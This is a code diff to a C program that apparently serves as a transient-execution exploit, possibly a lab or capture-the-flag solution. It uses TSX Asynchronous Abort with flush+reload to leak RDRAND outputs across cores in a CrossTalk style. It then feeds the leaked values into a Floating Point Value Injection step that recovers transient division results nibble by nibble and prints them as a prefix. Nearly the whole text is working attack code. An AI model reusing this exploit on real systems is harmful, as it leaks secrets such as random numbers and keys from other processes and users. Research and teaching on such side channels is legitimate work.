@@ -12,16 +12,18 @@
 
 #define NUM_SAMPLES 10000
 #define NUM_ITERATIONS 10
-#define CONFIDENCE_THRESHOLD 2
+#define CONFIDENCE_THRESHOLD 5
 #define ROUNDS 100
-#define STRIDE 4096    
+#define STRIDE 4096
+#define FPVI_STRIDE 2048
 #define POSSIBLE_BYTES 256
 #define BYTES_TO_LEAK 8               
 #define RDRAND_OFFSET 32
+#define RDRAND_TO_LEAK 6
 
 
 static uint8_t *leak;
-static uint8_t *reloadbuffer;                     
+static uint8_t *crosstalk_reloadbuffer;                     
 static uint64_t CACHE_THRESHOLD;
 
 
@@ -100,16 +102,26 @@ uint64_t get_reload_time(unsigned char *addr) {
     return delta_t;
 }
 
-bool is_equal(unsigned char *a, unsigned char *b, size_t len) {
-    for (size_t i = 0; i < len; i++) {
-        if (a[i] != b[i]) {
-            return false;
+void reload_and_measure(unsigned char *crosstalk_reloadbuffer, size_t *cache_hits, uint64_t threshold) {
+    for(int j = 0; j < 16; j++) {
+        mfence();
+        uint64_t start = rdtscp();
+        *(volatile char*)(&crosstalk_reloadbuffer[j * FPVI_STRIDE]);
+        lfence();
+        uint64_t end = rdtscp();
+        
+        uint64_t reload_time = end - start;
+        if(reload_time < threshold) {
+            cache_hits[j]++;
         }
     }
-    return true;
 }
 
 int main(void) {
+    uint64_t rand_val;
+    asm volatile("rdrand %%rax" : "=a"(rand_val));
+
+    printf("Random value: 0x%016lx\n", rand_val);
 
     CACHE_THRESHOLD = get_cache_threshold()* 0.7;
 
@@ -132,20 +144,21 @@ int main(void) {
     size_t const mmap_prot = PROT_READ | PROT_WRITE;
     size_t const mmap_flags = MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE| MAP_HUGETLB;
 
-    unsigned char result[BYTES_TO_LEAK];
-    unsigned char prev_result[BYTES_TO_LEAK];
     leak = mmap(NULL, leak_len, mmap_prot, mmap_flags, -1, 0);
     if (leak == MAP_FAILED) { perror("mmap leak"); return 1; }
 
-    reloadbuffer = mmap(NULL, POSSIBLE_BYTES * STRIDE, mmap_prot, mmap_flags, -1, 0);
-    if (reloadbuffer == MAP_FAILED) { perror("mmap reloadbuffer"); return 1; }
+    crosstalk_reloadbuffer = mmap(NULL, POSSIBLE_BYTES * STRIDE, mmap_prot, mmap_flags, -1, 0);
+    if (crosstalk_reloadbuffer == MAP_FAILED) { perror("mmap crosstalk_reloadbuffer"); return 1; }
 
     size_t leaked_values_count = 0;
-    unsigned char leaked_values[BYTES_TO_LEAK * 1000] = {0};
+    uint64_t leaked_values[RDRAND_TO_LEAK * BYTES_TO_LEAK] = {0};
 
     // ===================================================PARENT=======================================================
 
-    while(1) {
+    uint64_t crosstalk_result = 0;
+    while(leaked_values_count < RDRAND_TO_LEAK) {
+        uint64_t prev_crosstalk_result = crosstalk_result;
+
         for( int secret_byte=RDRAND_OFFSET; secret_byte < RDRAND_OFFSET + BYTES_TO_LEAK; secret_byte++) {
             uint32_t all_hit_bytes[256] = {0};
 
@@ -153,25 +166,25 @@ int main(void) {
                 
                 // Step 1: flush reload buffer
                 for (int i = 0; i < POSSIBLE_BYTES; i++) {
-                    clflush(&reloadbuffer[i * STRIDE]);
+                    clflush(&crosstalk_reloadbuffer[i * STRIDE]);
                 }
 
                 clflush(leak + secret_byte);
                 sfence();
-                clflush(reloadbuffer); // Necessary to cause TAA
+                clflush(crosstalk_reloadbuffer); // Necessary to cause TAA
 
                 // Step 3: TAA
                 if (_xbegin() == _XBEGIN_STARTED)
                 {
                     size_t index = *(leak + secret_byte) * STRIDE; // This should use the data in the LFB transiently.
-                    *(volatile char*)(reloadbuffer + index);
+                    *(volatile char*)(crosstalk_reloadbuffer + index);
 
                     _xend();
                 }
 
                 // Step 4: Reload and measure access times
                 for(int j=0; j<POSSIBLE_BYTES; j++){
-                    uint64_t reload_time = get_reload_time(&reloadbuffer[j * STRIDE]);
+                    uint64_t reload_time = get_reload_time(&crosstalk_reloadbuffer[j * STRIDE]);
                     if(reload_time < CACHE_THRESHOLD){
                         all_hit_bytes[j]++;
                         break;
@@ -180,9 +193,9 @@ int main(void) {
             }
 
             // Analyze results to find the most likely byte value
-            int max_index = 0;
-            int max_hits = 0;
-            for(int i = 0; i < 256; i++) {
+            uint8_t max_index = 0;
+            size_t max_hits = 0;
+            for(int i = 1; i < 256; i++) {
                 int hits = all_hit_bytes[i];
 
                 if(hits > CONFIDENCE_THRESHOLD) {
@@ -196,30 +209,107 @@ int main(void) {
                 }
             }
 
-            result[secret_byte - RDRAND_OFFSET] = max_index;
+            crosstalk_result = crosstalk_result << 8 | max_index;
         }
 
-        if (!is_equal(result, prev_result, BYTES_TO_LEAK))
+        if (crosstalk_result == 0 ||
+            crosstalk_result == rand_val ||
+            crosstalk_result != prev_crosstalk_result)
         {
-            memcpy(prev_result, result, BYTES_TO_LEAK);
             continue;
         }
 
         if (leaked_values_count == 0 ||
-            !is_equal(result, &leaked_values[(leaked_values_count - 1) * BYTES_TO_LEAK], BYTES_TO_LEAK))
+            crosstalk_result != leaked_values[leaked_values_count - 1])
         {
-            for (int i = 0; i < BYTES_TO_LEAK; i++) {
-                leaked_values[(leaked_values_count) * BYTES_TO_LEAK + i] = result[i];
-            }
+            leaked_values[leaked_values_count] = crosstalk_result;
 
             ++leaked_values_count;
         }
-
-        printf("Leaked %zu values\n", leaked_values_count);
-        for (size_t i = 0; i < leaked_values_count; i++) {
-            printf("0x%02x%02x%02x%02x%02x%02x%02x%02x\n", leaked_values[i * BYTES_TO_LEAK], leaked_values[i * BYTES_TO_LEAK + 1], leaked_values[i * BYTES_TO_LEAK + 2], leaked_values[i * BYTES_TO_LEAK + 3], leaked_values[i * BYTES_TO_LEAK + 4], leaked_values[i * BYTES_TO_LEAK + 5], leaked_values[i * BYTES_TO_LEAK + 6], leaked_values[i * BYTES_TO_LEAK + 7]);
-        }
     }
+
+    for (size_t i = 0; i < leaked_values_count; ++i) {
+        printf("Leaked value %zu: 0x%016lx\n", i, leaked_values[i]);
+    }
+
+    uint64_t fpvi_results[3] = {0};
+    for (size_t i = 0; i < leaked_values_count; ++i) {
+        int fvpi_reloadbuffer_size = 16 * FPVI_STRIDE;
+        unsigned char *fpvi_reloadbuffer = mmap(NULL, fvpi_reloadbuffer_size, PROT_READ | PROT_WRITE,
+                                            MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
+        memset(fpvi_reloadbuffer, 0, fvpi_reloadbuffer_size);
+
+        uint64_t dx = leaked_values[i] & 0x000FFFFFFFFFFFFFULL;
+        uint64_t dy = leaked_values[++i] & 0x000FFFFFFFFFFFFFULL;
+
+        double fpvi_result = (double)dx / (double)dy;
+        uint64_t architectural_result = (uint64_t)fpvi_result;
+
+        // Recover transient result nibble by nibble
+        uint64_t transient_result = 0;
+
+        for (int nibble_index = 0; nibble_index < 16; nibble_index++) {
+            size_t cache_hits[16] = {0};
+
+            for (int i = 0; i < NUM_ITERATIONS; i++) {
+                // 1. Flush
+                for (int j = 0; j < 16; j++) {
+                    clflush(&fpvi_reloadbuffer[j * FPVI_STRIDE]);
+                }
+                mfence();
+
+                // 2. FPVI 
+                asm volatile(
+                    ".rept 2                    \n\t" 
+                    "  movq  %[x], %%xmm0       \n\t"  
+                    "  movq  %[y], %%xmm1       \n\t"  
+                    "  divsd %%xmm1, %%xmm0     \n\t"
+                    ".endr                      \n\t"
+                    "movq %%xmm0, %%rax         \n\t"
+                    "mov  %[shift], %%ecx       \n\t"
+                    "shrq %%cl, %%rax           \n\t"
+                    "and  $0xf, %%rax           \n\t"  // 4 bits for nibble
+                    "shl  $11, %%rax            \n\t"  // STRIDE shift to calculate cache offset
+                    "add  %[buf], %%rax         \n\t"
+                    "movb (%%rax), %%al         \n\t"  //access to bring into cache
+                    :
+                    : [x]"m"(dx),
+                    [y]"m"(dy),
+                    [buf]"r"(fpvi_reloadbuffer),
+                    [shift]"r"(nibble_index * 4)
+                    : "rax","rcx","xmm0","xmm1","memory"
+                );
+    
+                // 3. Reload and measure
+                reload_and_measure(fpvi_reloadbuffer, cache_hits, CACHE_THRESHOLD);
+            }
+
+            // extract the 4 bit architectural nibble with index nibble_index
+            uint8_t architectural_nibble = (architectural_result >> (nibble_index * 4)) & 0xf;
+            uint8_t transient_nibble = architectural_nibble;
+            
+            
+            //get the most hit that is not the architectural one 
+            for(int j = 0; j < 16; j++) { // exclude the correct cache hit we are not interested in teh architectural one
+                if(cache_hits[j] > 5 && j != architectural_nibble) {
+                    transient_nibble = j;
+                    break;
+                }
+            }
+            
+            //to reconstruct the transient result
+            transient_result |= ((uint64_t)transient_nibble) << (nibble_index * 4);
+        }
+        fpvi_results[i / 2] = transient_result;
+    }
+
+    char *b = malloc(3 * sizeof(uint64_t));
+    for (size_t i = 0; i < 3; ++i) {
+        printf("FPVI transient result %zu: 0x%016lx\n", i, fpvi_results[i]);
+        strncpy(b + i * sizeof(uint64_t), (char*)&fpvi_results[i], sizeof(uint64_t));
+    }
+
+    printf("Prefix: %s\n", b);
 
     kill(pid, SIGKILL);
     waitpid(pid, NULL, 0);
